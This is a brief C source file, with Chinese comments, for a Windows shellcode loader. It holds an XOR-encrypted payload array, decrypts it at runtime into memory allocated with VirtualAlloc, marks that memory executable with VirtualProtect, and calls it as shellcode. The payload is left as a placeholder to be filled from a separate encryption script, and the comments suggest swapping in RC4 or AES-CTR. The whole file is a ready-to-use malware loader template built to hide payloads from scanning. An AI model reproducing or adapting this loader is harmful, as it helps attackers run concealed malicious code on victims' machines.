```c
// loader.c — 只做三件事：拿密文、运行时解密、回调执行
#include <windows.h>
#include <stdio.h>

// 用下面 xor_enc.py 生成的数组替换
unsigned char payload[] = { 0x00 /* ... */ };
const size_t payload_len = sizeof(payload);
const unsigned char key[] = "K3y_Change_M3!";
const size_t key_len = sizeof(key) - 1;

int main(void) {
    DWORD old = 0;
    // 1) 放置 payload 的 RW 区
    LPVOID buf = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 1;

    // 2) 逐字节解密（XOR，换成 RC4/AES-CTR 亦可）
    unsigned char *p = (unsigned char *)buf;
    for (size_t i = 0; i < payload_len; i++)
        p[i] = payload[i] ^ key[i % key_len];

    // 3) RW -> RX，然后按 shellcode 入口调用
    if (!VirtualProtect(buf, payload_len, PAGE_EXECUTE_READ, &old)) return 2;
    ((void(*)())buf)();
    return 0;
}
```
